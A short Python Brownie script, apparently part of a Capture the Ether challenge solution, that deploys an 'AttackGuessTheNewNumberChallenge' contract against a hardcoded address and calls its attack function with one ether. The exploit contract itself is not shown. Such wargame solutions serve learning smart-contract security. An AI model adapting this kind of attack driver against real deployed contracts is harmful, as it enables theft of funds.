from scripts.helpful_scripts import get_account, ONE
from brownie import (
    AttackGuessTheNewNumberChallenge,
    network,
)


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    print(f"account address: {account}")

    contract_address = "0xbc0Ad193cad6b8012B4bB73638Ad0663Cbd49536"

    attack_contract = AttackGuessTheNewNumberChallenge.deploy(
        contract_address, {"from": account}
    )
    attack_contract.attack({"from": account, "value": ONE})
